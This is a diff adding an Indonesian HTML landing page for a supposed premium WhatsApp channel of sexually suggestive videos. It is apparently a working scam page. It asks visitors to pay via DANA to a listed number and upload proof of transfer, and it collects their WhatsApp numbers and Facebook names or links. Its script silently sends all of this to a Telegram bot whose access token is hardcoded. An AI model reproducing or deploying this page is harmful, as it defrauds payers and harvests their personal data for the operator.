@@ -1,0 +1,368 @@
+<!DOCTYPEhtml>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gabung Saluran WhatsApp Premium 🔒</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: url('bgroun.jpg') no-repeat center center fixed;
+      background-size: cover;
+      backdrop-filter: blur(6px);
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 50px auto;
+      background-color: rgba(255,255,255,0.95);
+      border-radius: 15px;
+      padding: 25px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .group-header img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      border: 4px solid #25D366;
+      object-fit: cover;
+    }
+
+    .group-header h1 {
+      margin: 15px 0 5px;
+      font-size: 22px;
+      color: #075E54;
+    }
+
+    .group-header p {
+      font-size: 14px;
+      color: #555;
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    .stat-box {
+      background: #f0f0f0;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .stat-box strong {
+      display: block;
+      font-size: 20px;
+      color: #25D366;
+    }
+
+    .stat-box span {
+      font-size: 13px;
+      color: #444;
+    }
+
+    .btn-join {
+      background-color: #25D366;
+      color: white;
+      padding: 15px;
+      border: none;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .upload-form {
+      margin-top: 20px;
+      display: none;
+      text-align: left;
+    }
+
+    .upload-form label {
+      margin-top: 10px;
+      font-size: 14px;
+      display: block;
+    }
+
+    .upload-form input, .upload-form textarea {
+      padding: 10px;
+      margin-top: 5px;
+      width: 100%;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-family: inherit;
+      font-size: 14px;
+    }
+
+    .upload-form textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .upload-form button {
+      background: #128C7E;
+      color: white;
+      padding: 12px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    #info, #infoAdmin, #infoHelp {
+      margin-top: 10px;
+      color: green;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    /* Galeri Foto */
+    .galeri-container {
+      margin-top: 40px;
+      text-align: center;
+    }
+
+    .galeri-container h3 {
+      margin-bottom: 15px;
+      color: #075E54;
+    }
+
+    .galeri-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 10px;
+    }
+
+    .galeri-grid img {
+      width: 100%;
+      height: 100px;
+      object-fit: cover;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+
+    .galeri-grid img:hover {
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="group-header">
+      <img src="foto2.jpg" alt="Foto Saluran" />
+      <h1>Saluran Video Cindo 😋💦</h1>
+      <p>vidio super Premium gacor 😋💦</p>
+    </div>
+
+    <div class="stats">
+      <div class="stat-box"><strong>✅</strong><span>vidio campuran cindo😋💦</span></div>
+      <div class="stat-box"><strong>🚫</strong><span>Tidak Ada Spam</span></div>
+      <div class="stat-box"><strong>🔐</strong><span>Privasi Terjamin</span></div>
+      <div class="stat-box"><strong>⚡</strong><span>Update Real-Time</span></div>
+      <div class="stat-box"><strong>⭐</strong><span>Akses Eksklusif</span></div>
+      <div class="stat-box"><strong>📤</strong><span>Gratis Repost</span></div>
+    </div>
+
+    <button class="btn-join" onclick="showForm()">🔒 Gabung ke Saluran Sekarang</button>
+    <button class="btn-join" onclick="showAdminForm()">⭐ Jadi Admin (20K)</button>
+    <button class="btn-join" onclick="showHelpForm()">💬 Pusat Bantuan Chat</button>
+
+    <!-- Form Gabung Saluran -->
+    <div class="upload-form" id="uploadForm">
+      <label>📷 Scan QR / Transfer ke DANA:</label>
+      <img src="QR.jpg" alt="QR Code" style="width:100%; max-width:200px; display:block; margin:10px auto;" />
+      <p style="text-align:center;"><strong>Nomor DANA: 083138732834</strong></p>
+
+      <label>Upload Bukti Transfer:</label>
+      <input type="file" id="bukti" accept="image/*" />
+
+      <label>Nomor WhatsApp Anda:</label>
+      <input type="text" id="wa" placeholder="081234567890" />
+
+      <label>Nama Facebook Anda:</label>
+      <input type="text" id="fb" placeholder="Contoh: Andi Saputra" />
+
+      <button onclick="kirimData()">Kirim Bukti</button>
+      <div id="info"></div>
+    </div>
+
+    <!-- Form Admin -->
+    <div class="upload-form" id="adminForm">
+      <label>💼 Transfer 20K ke DANA untuk jadi Admin:</label>
+      <img src="qrprem.jpg" alt="QR Admin" style="width:100%; max-width:200px; display:block; margin:10px auto;" />
+      <p style="text-align:center;"><strong>Nomor DANA: 083138732834</strong></p>
+
+      <label>Upload Bukti Transfer:</label>
+      <input type="file" id="buktiAdmin" accept="image/*" />
+
+      <label>Nomor WhatsApp Anda:</label>
+      <input type="text" id="waAdmin" placeholder="081234567890" />
+
+      <label>Link Facebook Anda:</label>
+      <input type="text" id="fbAdmin" placeholder="https://facebook.com/username" />
+
+      <button onclick="kirimDataAdmin()">Kirim Bukti Admin</button>
+      <div id="infoAdmin"></div>
+    </div>
+
+    <!-- Form Pusat Bantuan Chat -->
+    <div class="upload-form" id="helpForm">
+      <label>💬 Kirim Pesan ke Mimin:</label>
+      <textarea id="helpText" placeholder="Tulis pesan Anda di sini..."></textarea>
+
+      <label>Upload File (opsional):</label>
+      <input type="file" id="helpFile" />
+
+      <button onclick="kirimHelp()">Kirim Pesan</button>
+      <div id="infoHelp"></div>
+    </div>
+
+    <!-- Galeri Foto -->
+    <div class="galeri-container">
+      <h3>🖼️ Galeri Foto</h3>
+      <div class="galeri-grid">
+        <img src="foto1.jpg" alt="Foto 1" />
+        <img src="foto2.jpg" alt="Foto 2" />
+        <img src="foto3.jpg" alt="Foto 3" />
+        <img src="foto4.jpg" alt="Foto 4" />
+        <img src="foto5.jpg" alt="Foto 5" />
+        <img src="foto6.jpg" alt="Foto 6" />
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showForm() {
+      document.getElementById("uploadForm").style.display = "block";
+      document.getElementById("adminForm").style.display = "none";
+      document.getElementById("helpForm").style.display = "none";
+    }
+
+    function showAdminForm() {
+      document.getElementById("adminForm").style.display = "block";
+      document.getElementById("uploadForm").style.display = "none";
+      document.getElementById("helpForm").style.display = "none";
+    }
+
+    function showHelpForm() {
+      document.getElementById("helpForm").style.display = "block";
+      document.getElementById("uploadForm").style.display = "none";
+      document.getElementById("adminForm").style.display = "none";
+    }
+
+    async function kirimData() {
+      const fileInput = document.getElementById("bukti");
+      const waNumber = document.getElementById("wa").value.trim();
+      const fbName = document.getElementById("fb").value.trim();
+      const info = document.getElementById("info");
+
+      if (!fileInput.files[0] || !waNumber || !fbName) {
+        alert("Harap isi semua kolom dan upload bukti.");
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append("document", fileInput.files[0]);
+      formData.append("caption", `Gabung Saluran:\nWhatsApp: ${waNumber}\nFacebook: ${fbName}`);
+
+      try {
+        const token = "7411979027:AAGfRmrAREFfUn3YA8wZHi0Fy-7DI7k2SR4";
+        const chat_id = "7819779147";
+
+        await fetch(`https://api.telegram.org/bot${token}/sendDocument?chat_id=${chat_id}`, {
+          method: "POST",
+          body: formData
+        });
+
+        info.textContent = "✅ Bukti terkirim! Tunggu beberapa menit bot akan mengirimkan link via WhatsApp & Facebook, harap masukkan informasi dengan benar agar bot segera sampai, terima kasih.";
+      } catch (e) {
+        info.textContent = "❌ Gagal kirim data ke Telegram.";
+      }
+    }
+
+    async function kirimDataAdmin() {
+      const fileInput = document.getElementById("buktiAdmin");
+      const waNumber = document.getElementById("waAdmin").value.trim();
+      const fbLink = document.getElementById("fbAdmin").value.trim();
+      const info = document.getElementById("infoAdmin");
+
+      if (!fileInput.files[0] || !waNumber || !fbLink) {
+        alert("Harap isi semua kolom dan upload bukti.");
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append("document", fileInput.files[0]);
+      formData.append("caption", `Permintaan Jadi Admin 20K:\nWhatsApp: ${waNumber}\nFacebook: ${fbLink}`);
+
+      try {
+        const token = "7411979027:AAGfRmrAREFfUn3YA8wZHi0Fy-7DI7k2SR4";
+        const chat_id = "7819779147";
+
+        await fetch(`https://api.telegram.org/bot${token}/sendDocument?chat_id=${chat_id}`, {
+          method: "POST",
+          body: formData
+        });
+
+        info.textContent = "✅ Bukti terkirim! Tunggu konfirmasi admin.";
+      } catch (e) {
+        info.textContent = "❌ Gagal kirim data ke Telegram.";
+      }
+    }
+
+    async function kirimHelp() {
+      const text = document.getElementById("helpText").value.trim();
+      const fileInput = document.getElementById("helpFile");
+      const info = document.getElementById("infoHelp");
+
+      if (!text && !fileInput.files[0]) {
+        alert("Harap tulis pesan atau upload file.");
+        return;
+      }
+
+      const token = "7411979027:AAGfRmrAREFfUn3YA8wZHi0Fy-7DI7k2SR4";
+      const chat_id = "7819779147";
+
+      try {
+        if (fileInput.files[0]) {
+          // Kirim file dengan caption pesan
+          const formData = new FormData();
+          formData.append("document", fileInput.files[0]);
+          formData.append("caption", `Pesan dari user:\n${text || "(tanpa pesan teks)"}`);
+
+          await fetch(`https://api.telegram.org/bot${token}/sendDocument?chat_id=${chat_id}`, {
+            method: "POST",
+            body: formData
+          });
+        } else {
+          // Kirim pesan teks saja
+          const urlText = encodeURIComponent(text);
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${urlText}`, {
+            method: "GET"
+          });
+        }
+
+        info.textContent = "✅ Pesan terkirim ke Mimin. Terima kasih!";
+        // Reset form
+        document.getElementById("helpText").value = "";
+        fileInput.value = "";
+      } catch (e) {
+        info.textContent = "❌ Gagal kirim pesan ke Telegram.";
+      }
+    }
+  </script>
+
+</body>
+</html>
